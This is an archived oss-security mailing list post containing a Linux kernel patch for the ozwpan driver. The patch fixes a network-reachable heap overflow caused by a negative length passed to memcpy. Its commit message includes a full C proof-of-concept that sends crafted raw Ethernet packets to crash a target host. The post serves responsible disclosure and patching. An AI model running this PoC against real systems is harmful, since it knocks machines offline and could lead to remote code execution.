X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5490" "Tuesday" "26" "May" "2015" "14:17:46" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1432642669-7289-2-git-send-email-Jason@zx2c4.com>" "207" "[oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow" nil nil nil "5" "2015052612:17:46" "[oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow" (number mark "U       Jason@zx2c4. May 26  207/5490  " thread-indent "\"[oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow\"\n") "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>" ("<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19545 invoked by uid 550); 26 May 2015 12:18:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19469 invoked from network); 26 May 2015 12:18:28 -0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
	:subject:date:message-id:in-reply-to:references; s=mail; bh=sDwk
	2WY2/5ySY7qCPJhQOV8C1jU=; b=FWgY5NpKBe7pYkcqW8OsCrLMJR+Yfj1nOpEi
	Q7ca0tmQYPgUHuSarVct8V3rhiOhZ17aIsaA+DHdO5zbJRPuInQY7XlXEBMuvaGl
	2tfxxTQ0tQ3I6TQIn1osdrNKdMeQtJzeXuxrebKziPGOT1oMMttl2PM+vNvVlrD8
	BgOCi/j2syCP/tSudy1hEiRokt4y998R74943lXy8ju+41h37uBGOMIVQt2iuasi
	tyHBVZJeybUswYODMSTdMPE0wf7uFPbA+fMAzqc5JAYa18kHcL3DNlrGhnaGQra+
	iD8fRCeN2azykcHNfBgnjBGHoso4jlU9+bykwbg/KxCRg0JALQ==
From: "Jason A. Donenfeld" <Jason@zx2c4.com>
To: oss-security <oss-security@lists.openwall.com>,
	linux-kernel@vger.kernel.org,
	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	devel@driverdev.osuosl.org
Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
Date: Tue, 26 May 2015 14:17:46 +0200
Message-Id: <1432642669-7289-2-git-send-email-Jason@zx2c4.com>
X-Mailer: git-send-email 2.4.1
In-Reply-To: <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
References: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
 <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
Subject: [oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow

Since elt->length is a u8, we can make this variable a u8. Then we can
do proper bounds checking more easily. Without this, a potentially
negative value is passed to the memcpy inside oz_hcd_get_desc_cnf,
resulting in a remotely exploitable heap overflow with network
supplied data.

This could result in remote code execution. A PoC which obtains DoS
follows below. It requires the ozprotocol.h file from this module.

=-=-=-=-=-=

 #include <arpa/inet.h>
 #include <linux/if_packet.h>
 #include <net/if.h>
 #include <netinet/ether.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <endian.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>

 #define u8 uint8_t
 #define u16 uint16_t
 #define u32 uint32_t
 #define __packed __attribute__((__packed__))
 #include "ozprotocol.h"

static int hex2num(char c)
{
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'f')
		return c - 'a' + 10;
	if (c >= 'A' && c <= 'F')
		return c - 'A' + 10;
	return -1;
}
static int hwaddr_aton(const char *txt, uint8_t *addr)
{
	int i;
	for (i = 0; i < 6; i++) {
		int a, b;
		a = hex2num(*txt++);
		if (a < 0)
			return -1;
		b = hex2num(*txt++);
		if (b < 0)
			return -1;
		*addr++ = (a << 4) | b;
		if (i < 5 && *txt++ != ':')
			return -1;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	if (argc < 3) {
		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
		return 1;
	}

	uint8_t dest_mac[6];
	if (hwaddr_aton(argv[2], dest_mac)) {
		fprintf(stderr, "Invalid mac address.\n");
		return 1;
	}

	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (sockfd < 0) {
		perror("socket");
		return 1;
	}

	struct ifreq if_idx;
	int interface_index;
	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		return 1;
	}
	interface_index = if_idx.ifr_ifindex;
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
		perror("SIOCGIFHWADDR");
		return 1;
	}
	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;

	struct {
		struct ether_header ether_header;
		struct oz_hdr oz_hdr;
		struct oz_elt oz_elt;
		struct oz_elt_connect_req oz_elt_connect_req;
	} __packed connect_packet = {
		.ether_header = {
			.ether_type = htons(OZ_ETHERTYPE),
			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
		},
		.oz_hdr = {
			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
			.last_pkt_num = 0,
			.pkt_num = htole32(0)
		},
		.oz_elt = {
			.type = OZ_ELT_CONNECT_REQ,
			.length = sizeof(struct oz_elt_connect_req)
		},
		.oz_elt_connect_req = {
			.mode = 0,
			.resv1 = {0},
			.pd_info = 0,
			.session_id = 0,
			.presleep = 35,
			.ms_isoc_latency = 0,
			.host_vendor = 0,
			.keep_alive = 0,
			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
			.max_len_div16 = 0,
			.ms_per_isoc = 0,
			.up_audio_buf = 0,
			.ms_per_elt = 0
		}
	};

	struct {
		struct ether_header ether_header;
		struct oz_hdr oz_hdr;
		struct oz_elt oz_elt;
		struct oz_get_desc_rsp oz_get_desc_rsp;
	} __packed pwn_packet = {
		.ether_header = {
			.ether_type = htons(OZ_ETHERTYPE),
			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
		},
		.oz_hdr = {
			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
			.last_pkt_num = 0,
			.pkt_num = htole32(1)
		},
		.oz_elt = {
			.type = OZ_ELT_APP_DATA,
			.length = sizeof(struct oz_get_desc_rsp) - 2
		},
		.oz_get_desc_rsp = {
			.app_id = OZ_APPID_USB,
			.elt_seq_num = 0,
			.type = OZ_GET_DESC_RSP,
			.req_id = 0,
			.offset = htole16(0),
			.total_size = htole16(0),
			.rcode = 0,
			.data = {0}
		}
	};

	struct sockaddr_ll socket_address = {
		.sll_ifindex = interface_index,
		.sll_halen = ETH_ALEN,
		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
	};

	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
		perror("sendto");
		return 1;
	}
	usleep(300000);
	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
		perror("sendto");
		return 1;
	}
	return 0;
}

Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
---
 drivers/staging/ozwpan/ozusbsvc1.c | 11 ++++++++---
 1 file changed, 8 insertions(+), 3 deletions(-)

diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
index d434d8c..35198b9 100644
--- a/drivers/staging/ozwpan/ozusbsvc1.c
+++ b/drivers/staging/ozwpan/ozusbsvc1.c
@@ -390,10 +390,15 @@ void oz_usb_rx(struct oz_pd *pd, struct oz_elt *elt)
 	case OZ_GET_DESC_RSP: {
 			struct oz_get_desc_rsp *body =
 				(struct oz_get_desc_rsp *)usb_hdr;
-			int data_len = elt->length -
+			u16 offs, total_size;
+			u8 data_len;
+
+			data_len = elt->length -
 					sizeof(struct oz_get_desc_rsp) + 1;
-			u16 offs = le16_to_cpu(get_unaligned(&body->offset));
-			u16 total_size =
+			if (data_len > elt->length)
+				break;
+			offs = le16_to_cpu(get_unaligned(&body->offset));
+			total_size =
 				le16_to_cpu(get_unaligned(&body->total_size));
 			oz_dbg(ON, "USB_REQ_GET_DESCRIPTOR - cnf\n");
 			oz_hcd_get_desc_cnf(usb_ctx->hport, body->req_id,
-- 
2.4.1

